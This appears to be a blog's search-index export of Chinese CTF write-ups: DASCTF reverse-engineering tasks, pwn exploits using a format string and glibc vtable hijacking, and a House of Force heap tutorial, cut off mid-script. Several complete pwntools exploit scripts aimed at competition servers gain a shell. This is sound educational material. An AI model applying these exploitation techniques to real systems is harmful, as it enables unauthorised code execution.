<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DASCTF安恒月赛(6th)</title>
    <link href="/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <url>/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-6th"><a href="#DASCTF安恒月赛-6th" class="headerlink" title="DASCTF安恒月赛(6th)"></a>DASCTF安恒月赛(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pyc文件恢复"><a href="#pyCharm-pyc文件恢复" class="headerlink" title="pyCharm(pyc文件恢复)"></a>pyCharm(pyc文件恢复)</h3><p>这个题基本参考<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>来做的。</p><h4 id="加载pyc-co-code"><a href="#加载pyc-co-code" class="headerlink" title="加载pyc co_code"></a>加载<code>pyc co_code</code></h4><pre><code>In [1]: import dis,marshalIn [2]: f=open(&#39;1.pyc&#39;)In [3]: f.read(4)Out[3]: &#39;\x03\xf3\r\n&#39;In [4]: f.read(4)Out[4]: &#39;jv\xe7^&#39;In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;)In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:(&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;)In [9]: code.co_codeOut[9]: &quot;q\x03\x00q\x00\x06d\xffd\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00Z\x01\x00e\x02\x00d\x03\x00\x83\x01\x00Z\x03\x00e\x00\x00j\x04\x00e\x03\x00\x83\x01\x00Z\x05\x00e\x06\x00e\x05\x00\x83\x01\x00Z\x07\x00x&#39;\x00e\x08\x00d\x04\x00d\x05\x00\x83\x02\x00D]\x16\x00Z\t\x00e\x07\x00e\t\x00c\x02\x00\x19d\x06\x007\x03&lt;qI\x00Wd\x07\x00j\n\x00e\x07\x00\x83\x01\x00Z\x0b\x00e\x0b\x00e\x01\x00k\x02\x00r\x86\x00d\x08\x00GHn\x05\x00d\t\x00GHd\x01\x00S&quot;</code></pre><h4 id="使用dis库对co-code进行反编译"><a href="#使用dis库对co-code进行反编译" class="headerlink" title="使用dis库对co_code进行反编译:"></a>使用dis库对<code>co_code</code>进行反编译:</h4><pre><code>In [10]: dis.dis(code.co_code)          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE         11 LOAD_CONST          1 (1)         14 IMPORT_NAME         0 (0)         17 STORE_NAME          0 (0)         20 LOAD_CONST          2 (2)         23 STORE_NAME          1 (1)         26 LOAD_NAME           2 (2)         29 LOAD_CONST          3 (3)         32 CALL_FUNCTION       1         35 STORE_NAME          3 (3)         38 LOAD_NAME           0 (0)         41 LOAD_ATTR           4 (4)         44 LOAD_NAME           3 (3)         47 CALL_FUNCTION       1         50 STORE_NAME          5 (5)         53 LOAD_NAME           6 (6)         56 LOAD_NAME           5 (5)         59 CALL_FUNCTION       1         62 STORE_NAME          7 (7)         65 SETUP_LOOP         39 (to 107)         68 LOAD_NAME           8 (8)         71 LOAD_CONST          4 (4)         74 LOAD_CONST          5 (5)         77 CALL_FUNCTION       2         80 GET_ITER         81 FOR_ITER           22 (to 106)         84 STORE_NAME          9 (9)         87 LOAD_NAME           7 (7)         90 LOAD_NAME           9 (9)         93 DUP_TOPX            2         96 BINARY_SUBSCR         97 LOAD_CONST          6 (6)        100 INPLACE_ADD        101 ROT_THREE        102 STORE_SUBSCR        103 JUMP_ABSOLUTE      73    &gt;&gt;  106 POP_BLOCK    &gt;&gt;  107 LOAD_CONST          7 (7)        110 LOAD_ATTR          10 (10)        113 LOAD_NAME           7 (7)        116 CALL_FUNCTION       1        119 STORE_NAME         11 (11)        122 LOAD_NAME          11 (11)        125 LOAD_NAME           1 (1)        128 COMPARE_OP          2 (==)        131 POP_JUMP_IF_FALSE   134    &gt;&gt;  134 LOAD_CONST          8 (8)        137 PRINT_ITEM        138 PRINT_NEWLINE        139 JUMP_FORWARD        5 (to 147)        142 LOAD_CONST          9 (9)        145 PRINT_ITEM        146 PRINT_NEWLINE    &gt;&gt;  147 LOAD_CONST          1 (1)        150 RETURN_VALUE</code></pre><p>这里面需要注意的就是开头的：</p><pre><code>          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE</code></pre><p>明显加入了混淆，怎么突然就停止了<code>STOP_CODE</code>。接着就是想办法去除这些混淆，和修正<code>co_code</code>长度，期望修改后的opcode首行为</p><pre><code>0 LOAD_CONST 0(0)1 LOAD_CONST 1(1)</code></pre><p>其中这种二进制字节码对应的翻译结果：</p><pre><code>0x64 操作为LOAD_CONST，用法举例：LOAD_CONST 1        HEX: 6401000x71 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE 14                HEX: 710e000x65 操作为LOAD_NAME，用法举例：LOAD_NAME 1                HEX: 6501000x71 操作为LOAD_NAME，</code></pre><p>所以寻找：</p><pre><code>0 LOAD_CONST 0(0)</code></pre><p>即为寻找<code>HEX : 640000</code>这个作为混淆字段结束。<br>开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测：</p><pre><code>0 JUMP_ABSOLUTE       3</code></pre><p>￼￼￼￼￼￼<br>￼￼￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>那很明显混淆字段就是：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>然后用工具删除即可，其中0x97就是<code>co_code</code></p><pre><code>In [12]: len(code.co_code)Out[12]: 151In [13]: hex(151)Out[13]: &#39;0x97&#39;</code></pre><p>所以去除这8个字节的混淆代码，然后修改<code>co_code</code>长度为<code>0x8f</code>。</p><h4 id="还原后的pyc开头"><a href="#还原后的pyc开头" class="headerlink" title="还原后的pyc开头"></a>还原后的pyc开头</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>反编译方法就多种多样了，可以在线什么的，我使用的<code>uncompyle6</code>.</p><pre><code>uncompyle6 -o 1.py 1.pyc</code></pre><pre><code># uncompyle6 version 3.7.1# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37)# [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc-# Embedded file name: pyCharm.py# Compiled at: 2020-06-15 21:23:54import base64a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;flag = raw_input(&#39;Are u ready?&#39;)c = base64.b64encode(flag)d = list(c)for i in range(0, 32):    d[i] += &#39;a&#39;ohh = (&#39;&#39;).join(d)if ohh == a:    print &#39;great!waht u input is the flag u wanna get.&#39;else:    print &#39;pity!&#39;%</code></pre><p>反编译后这题就十分简单了。</p><p>给的字符串把“a”，去除后解码base64即可。</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。<br>然后丢vscode。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>直接路径就出来了。</p><pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5一下即可。</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./springboard&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:  io = process(local_file)  libc = ELF(local_libc)else:  io = remote(&#39;183.129.189.60&#39;,10029)  libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():  # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)  gdb.attach(io)  pause()</code></pre></li></ul><p>sla(“input”,”1”)<br>sla(“input”,”2”)<br>sla(“input”,”3”)<br>sla(“input”,”%13$pAAAA%11$p”)<br>sleep(0.1)<br>ru(“0x”)<br>tag = int(r(12),16) - 0xe0<br>ru(“AAAA0x”)<br>libc_base = int(r(12),16) -0x21b97<br>info_addr(“libc_base”,libc_base)<br>key1 = hex(tag)[-4:]<br>print(key1)<br>payload = ‘%{}c%13$hn’.format(int(key1,16))<br>sla(“input”,payload)<br>sleep(5)<br>rec = rce18<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">1</a> + libc_base<br>key2 = hex(rec)[-4:]<br>print(key2)<br>payload = ‘%{}c%39$hn’.format(int(key2,16))<br>sla(“input”,payload)<br>sleep(5)<br>key3 = int(hex(tag)[-2:],16) + 2<br>print(key3)<br>payload = ‘%{}c%13$hhn’.format(key3)<br>sla(“input”,payload)<br>sleep(5)<br>key4 = hex(rec)[-6:-4]<br>print(key4)<br>payload = ‘%{}c%39$hhn’.format(int(key4,16))<br>sla(“input”,payload)<br>itr()</p><h1 id="0000-0x7fffffffe2f0-–-gt-0x555555554980-push-r15"><a href="#0000-0x7fffffffe2f0-–-gt-0x555555554980-push-r15" class="headerlink" title="0000| 0x7fffffffe2f0 –&gt; 0x555555554980 (push   r15)"></a>0000| 0x7fffffffe2f0 –&gt; 0x555555554980 (push   r15)</h1><h1 id="0008-0x7fffffffe2f8-–-gt-0x55554780"><a href="#0008-0x7fffffffe2f8-–-gt-0x55554780" class="headerlink" title="0008| 0x7fffffffe2f8 –&gt; 0x55554780"></a>0008| 0x7fffffffe2f8 –&gt; 0x55554780</h1><h1 id="0016-0x7fffffffe300-–-gt-0x555555756010-“11111111aaaaaaaa1111111122222222-n”"><a href="#0016-0x7fffffffe300-–-gt-0x555555756010-“11111111aaaaaaaa1111111122222222-n”" class="headerlink" title="0016| 0x7fffffffe300 –&gt; 0x555555756010 (“11111111aaaaaaaa1111111122222222\n”)"></a>0016| 0x7fffffffe300 –&gt; 0x555555756010 (“11111111aaaaaaaa1111111122222222\n”)</h1><h1 id="0024-0x7fffffffe308-–-gt-0x84fa9f2a7e35ae00"><a href="#0024-0x7fffffffe308-–-gt-0x84fa9f2a7e35ae00" class="headerlink" title="0024| 0x7fffffffe308 –&gt; 0x84fa9f2a7e35ae00"></a>0024| 0x7fffffffe308 –&gt; 0x84fa9f2a7e35ae00</h1><h1 id="0032-0x7fffffffe310-–-gt-0x555555554980-push-r15"><a href="#0032-0x7fffffffe310-–-gt-0x555555554980-push-r15" class="headerlink" title="0032| 0x7fffffffe310 –&gt; 0x555555554980 (push   r15)"></a>0032| 0x7fffffffe310 –&gt; 0x555555554980 (push   r15)</h1><h1 id="0040-0x7fffffffe318-–-gt-0x7ffff7a2d830-lt-libc-start-main-240-gt-mov-edi-eax"><a href="#0040-0x7fffffffe318-–-gt-0x7ffff7a2d830-lt-libc-start-main-240-gt-mov-edi-eax" class="headerlink" title="0040| 0x7fffffffe318 –&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)"></a>0040| 0x7fffffffe318 –&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)</h1><h1 id="0048-0x7fffffffe320-–-gt-0x1"><a href="#0048-0x7fffffffe320-–-gt-0x1" class="headerlink" title="0048| 0x7fffffffe320 –&gt; 0x1"></a>0048| 0x7fffffffe320 –&gt; 0x1</h1><h1 id="0056-0x7fffffffe328-–-gt-0x7fffffffe3f8-–-gt-0x7fffffffe67a-“-media-psf-mypwn-ahys-6-springboard-springboard”"><a href="#0056-0x7fffffffe328-–-gt-0x7fffffffe3f8-–-gt-0x7fffffffe67a-“-media-psf-mypwn-ahys-6-springboard-springboard”" class="headerlink" title="0056| 0x7fffffffe328 –&gt; 0x7fffffffe3f8 –&gt; 0x7fffffffe67a (“/media/psf/mypwn/ahys/6/springboard/springboard”)"></a>0056| 0x7fffffffe328 –&gt; 0x7fffffffe3f8 –&gt; 0x7fffffffe67a (“/media/psf/mypwn/ahys/6/springboard/springboard”)</h1><h1 id="0064-0x7fffffffe330-–-gt-0x1f7ffcca0"><a href="#0064-0x7fffffffe330-–-gt-0x1f7ffcca0" class="headerlink" title="0064| 0x7fffffffe330 –&gt; 0x1f7ffcca0"></a>0064| 0x7fffffffe330 –&gt; 0x1f7ffcca0</h1><h1 id="0072-0x7fffffffe338-–-gt-0x55555555488a-push-rbp"><a href="#0072-0x7fffffffe338-–-gt-0x55555555488a-push-rbp" class="headerlink" title="0072| 0x7fffffffe338 –&gt; 0x55555555488a (push   rbp)"></a>0072| 0x7fffffffe338 –&gt; 0x55555555488a (push   rbp)</h1><h1 id="0080-0x7fffffffe340-–-gt-0x0"><a href="#0080-0x7fffffffe340-–-gt-0x0" class="headerlink" title="0080| 0x7fffffffe340 –&gt; 0x0"></a>0080| 0x7fffffffe340 –&gt; 0x0</h1><h1 id="0088-0x7fffffffe348-–-gt-0x6e8193b15e1baa42"><a href="#0088-0x7fffffffe348-–-gt-0x6e8193b15e1baa42" class="headerlink" title="0088| 0x7fffffffe348 –&gt; 0x6e8193b15e1baa42"></a>0088| 0x7fffffffe348 –&gt; 0x6e8193b15e1baa42</h1><h1 id="0096-0x7fffffffe350-–-gt-0x555555554780-xor-ebp-ebp"><a href="#0096-0x7fffffffe350-–-gt-0x555555554780-xor-ebp-ebp" class="headerlink" title="0096| 0x7fffffffe350 –&gt; 0x555555554780 (xor    ebp,ebp)"></a>0096| 0x7fffffffe350 –&gt; 0x555555554780 (xor    ebp,ebp)</h1><h1 id="0104-0x7fffffffe358-–-gt-0x7fffffffe3f0-–-gt-0x1"><a href="#0104-0x7fffffffe358-–-gt-0x7fffffffe3f0-–-gt-0x1" class="headerlink" title="0104| 0x7fffffffe358 –&gt; 0x7fffffffe3f0 –&gt; 0x1"></a>0104| 0x7fffffffe358 –&gt; 0x7fffffffe3f0 –&gt; 0x1</h1><h1 id="0112-0x7fffffffe360-–-gt-0x0"><a href="#0112-0x7fffffffe360-–-gt-0x0" class="headerlink" title="0112| 0x7fffffffe360 –&gt; 0x0"></a>0112| 0x7fffffffe360 –&gt; 0x0</h1><h1 id="0120-0x7fffffffe368-–-gt-0x0"><a href="#0120-0x7fffffffe368-–-gt-0x0" class="headerlink" title="0120| 0x7fffffffe368 –&gt; 0x0"></a>0120| 0x7fffffffe368 –&gt; 0x0</h1><h1 id="0128-0x7fffffffe370-–-gt-0x3bd4c6e40b5baa42"><a href="#0128-0x7fffffffe370-–-gt-0x3bd4c6e40b5baa42" class="headerlink" title="0128| 0x7fffffffe370 –&gt; 0x3bd4c6e40b5baa42"></a>0128| 0x7fffffffe370 –&gt; 0x3bd4c6e40b5baa42</h1><h1 id="0136-0x7fffffffe378-–-gt-0x3bd4d65e62cbaa42"><a href="#0136-0x7fffffffe378-–-gt-0x3bd4d65e62cbaa42" class="headerlink" title="0136| 0x7fffffffe378 –&gt; 0x3bd4d65e62cbaa42"></a>0136| 0x7fffffffe378 –&gt; 0x3bd4d65e62cbaa42</h1><h1 id="0144-0x7fffffffe380-–-gt-0x0"><a href="#0144-0x7fffffffe380-–-gt-0x0" class="headerlink" title="0144| 0x7fffffffe380 –&gt; 0x0"></a>0144| 0x7fffffffe380 –&gt; 0x0</h1><h1 id="0152-0x7fffffffe388-–-gt-0x0"><a href="#0152-0x7fffffffe388-–-gt-0x0" class="headerlink" title="0152| 0x7fffffffe388 –&gt; 0x0"></a>0152| 0x7fffffffe388 –&gt; 0x0</h1><h1 id="0040-0x7ffe4f08d2d8-–-gt-0x7f2169b2a830"><a href="#0040-0x7ffe4f08d2d8-–-gt-0x7f2169b2a830" class="headerlink" title="0040| 0x7ffe4f08d2d8 –&gt; 0x7f2169b2a830"></a>0040| 0x7ffe4f08d2d8 –&gt; 0x7f2169b2a830</h1><pre><code>### secret考点就是`IO_FILE_`的相关知识了，是针对伪造 vtable 劫持程序流程。这个题估计是参考[https://xz.aliyun.com/t/7205][2]这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）#### fclose 函数调用的 vtable 函数![][image-5]vtable 函数 指针：</code></pre><p>/* The ‘finish’ function does any final cleaning up of an _IO_FILE object.<br>   It does not delete (free) it, but does everything else to finalize it.<br>   It matches the streambuf::~streambuf virtual destructor.  <em>/<br>typedef void (</em>_IO_finish_t) (FILE <em>, int); /</em> finalize */</p><p>#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</p><p>#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)</p><p>struct _IO_jump_t<br>{<br>    JUMP_FIELD(size_t, __dummy);<br>    JUMP_FIELD(size_t, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    /* showmany */<br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>};</p><pre><code>对于攻击的vtable 函数 指针其中的：- `__finish__`- `__close`其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 `__finish__`就可以了。#### libc2.29中的vtablevtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。**在glibc 2.23以及glibc 2.27其都是不可写的**。正是因为可以写，所以这个题难度就降低了很多。#### 攻击思路利用程序的最后一次任意地址写，直接把`__IO_2_1_stderr的vtable`上`__finish__`指针修改为one gadget。（这里的one gadget，需要自己多试）。##### 小tips第2次的2字节读入可以直接用其本来地址末2字节即可，直接在`__IO_2_1_stderr的vtable`不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个`\x60`一个字节即可。#### exp```pythonfrom pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10030)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&quot;0x&quot;)libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;]info_addr(&quot;libc_base&quot;,libc_base)ru(&quot;addr&quot;)vtable = 0x1e5758 + libc_bases(p64(vtable))sleep(0.1)# debug()s(&#39;\x60&#39;)sleep(0.1)rec = 0xe2386 + libc_bases(p64(0) + p64(0)+p64(rec))itr()</code></pre><p>由于提前就<code>fclose(stdout)</code>,getshell以后也不会有任何的输出，所以得用<code>exec 1&gt;&amp;2</code>来恢复输出。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Force</title>
    <link href="/2020/05/13/House%20of%20Force/"/>
    <url>/2020/05/13/House%20of%20Force/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本按照这wiki上面学的，简单记录一下。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3>House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li></ul><p>所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。</p><pre><code>// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><p>所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p><h2 id="一般的利用办法"><a href="#一般的利用办法" class="headerlink" title="一般的利用办法"></a>一般的利用办法</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><pre><code>remainder      = chunk_at_offset(victim, nb);av-&gt;top        = remainder;/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p><h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容"><a href="#让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容" class="headerlink" title="让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容"></a>让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。</p><p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p><h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p><h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ul><li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li><li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li><li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./bamboobox&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 1if debug:  io = process(local_file)  context.log_level = &#39;debug&#39;  libc = ELF(local_libc)else:  io = remote(&#39;node3.buuoj.cn&#39;,25784)  libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():  # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)  gdb.attach(io)  pause()</code></pre></li></ul><p>def add(size,content):<br>    sla(‘choice’,’2’)<br>    sla(‘item name:’,str(size))<br>    sa(‘item’,str(content))</p><p>def free(id):<br>    sla(‘choice’,’4’)<br>    sla(‘item’,str(id))</p><p>def show(id):<br>    sla(‘choice’,’1’)</p><p>def edit(id,size,content):<br>    sla(‘choice’,’3’)<br>    sla(‘item’,str(id))<br>    sla(‘item name’,str(size))<br>    sa(‘item’,str(content))</p><p>context.log_level = ‘debug’<br>magic = 0x400d49<br>add(0x30,’chum’)<br>payload = ‘a’ * 0x30 +p64(0) + p64(0xffffffffffffffff)<br>edit(0,0x40,payload)<br>size = -(0x40 + 0x20) - 0x10<br>add(size,’ 